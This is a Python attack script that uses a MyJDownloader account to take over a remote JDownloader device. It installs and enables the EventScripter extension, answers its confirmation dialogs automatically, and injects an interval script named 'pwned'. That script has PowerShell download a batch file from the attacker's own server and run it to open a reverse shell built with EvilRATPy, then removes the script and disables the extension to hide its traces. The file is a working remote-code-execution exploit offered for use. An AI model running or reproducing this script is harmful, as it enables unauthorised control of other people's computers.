import argparse
import json
import time

from myjdapi import myjdapi
from pathlib import Path
from EvilRATPy.evilRAT import createFinalPayload
from httpserver import ServeDirectoryWithHTTP


def answer_dialog(device, type, answer, timeout=30):
    dialogs = []
    start_time = time.time()
    while not dialogs:
        dialogs = device.dialogs.list()
        time.sleep(1.5)
        if start_time - time.time() > timeout:
            return False
    for dialog_id in dialogs:
        dialoginfo = device.dialogs.get(dialog_id)
        if dialoginfo["type"] == type:
            return device.dialogs.answer(dialog_id, answer)
    return False

def install_ext(device, id):
    isInstalled = device.extensions.isInstalled(id)
    if isInstalled:
        return True
    response = device.extensions.install(id)
    dialogType = "org.appwork.uio.ConfirmDialogInterface"
    response = {"dontshowagainselected": True, "closereason": "OK"}
    return answer_dialog(device, dialogType, response)

def toggle_ext(device, id, state):
    isEnabled = device.extensions.isEnabled(id)
    if isEnabled == state:
        return True
    return device.extensions.setEnabled(id, state)

def disable_ext(device, id):
    isEnabled = device.extensions.isEnabled(id)
    if isEnabled:
        return True
    return device.extensions.setEnabled(id, True)

def insert_event_script(device, script):
    r = device.config.set("org.jdownloader.extensions.eventscripter.EventScripterConfig",
                      "cfg/org.jdownloader.extensions.eventscripter.EventScripterExtension",
                      "Scripts", script)
    return r

def remove_event_script(device):
    r = device.config.reset("org.jdownloader.extensions.eventscripter.EventScripterConfig",
                        "cfg/org.jdownloader.extensions.eventscripter.EventScripterExtension",
                        "Scripts")
    return r

def select_device(jd):
    jd.update_devices()
    devices = jd.list_devices()
    print(f"[+] query devices - found {len(devices)} devices")
    for i,d in enumerate(devices):
        print(f"\t[{i+1}] {d['name']}")
    idx = -1
    while idx < 0 or idx > len(devices):
        idx = int(input("device: ").strip()) - 1

    device = jd.get_device(devices[idx]["name"])
    return device

def exploit(device, address, script=None):
    payload = [
        {
            "eventTrigger" : "INTERVAL",
            "eventTriggerSettings" : {
                "interval"      : 5000,
                "isSynchronous" : False
                },
            "id" : 1684009620891,
            "name" : "pwned",
            "script" : f"callAsync(function(c,s,e){{callAsync(function(c2,s2,e2){{}},\"cmd.exe\", \"/c\", \"C:/Temp/r.bat\");}},\"powershell.exe\", \"(New-Object Net.WebClient).DownloadFile(\\\\\\\"{address}/r.bat\\\\\\\",\\\\\\\"C:/Temp/r.bat\\\\\\\")\");",
            "enabled" : True
        }
    ]

    if script:
        payload[0]["script"] = json.load(script.open('r'))

    r = install_ext(device, "eventscripter")
    print(f"[+] installed eventscripter successfully: {r}")

    print("[+] waiting 25s for device to restart")
    time.sleep(25)

    r = toggle_ext(device, "eventscripter", True)
    print(f"[+] enabled eventscripter successfully: {r}")

    r = insert_event_script(device, json.dumps(payload))
    print(f"[+] insert event script successfully: {r}")

    response = {"dontshowagainselected": True, "closereason": "OK"}
    answer_dialog(device, "org.appwork.uio.ConfirmDialogInterface", response)

    print("[+] waiting 15s to ensure payload is executed")
    time.sleep(15)

    r = remove_event_script(device)
    print(f"[+] cleaned up event script successfully: {r}")

    r = toggle_ext(device, "eventscripter", False)
    print(f"[+] disabled eventscripter successfully: {r}")

def main():
    parser = argparse.ArgumentParser(description="Script to get RevShell via MyJdownloader")
    parser.add_argument("-e", "--email", help="email of MyJdownloader user")
    parser.add_argument("-p", "--password", help="password of MyJdownloader user")
    parser.add_argument("-s", "--script", type=Path, help="location of custom event script")
    parser.add_argument("lhost", help="ip address of attacker")
    parser.add_argument("lport", help="port of attacker")

    args = parser.parse_args()
    createFinalPayload(Path("r.bat"), args.lhost, args.lport)
    httpd, port = ServeDirectoryWithHTTP()

    jd = myjdapi.Myjdapi()
    jd.set_app_key("http://git.io/vmcsk")

    print(f"[+] connect to MyJdownloader account")
    jd.connect(args.email, args.password)
    device = select_device(jd)
    exploit(device, f"http://{args.lhost}:{port}", script=args.script)
    httpd.shutdown()
    jd.disconnect()

print("running main")
if __name__ == '__main__':
    main()
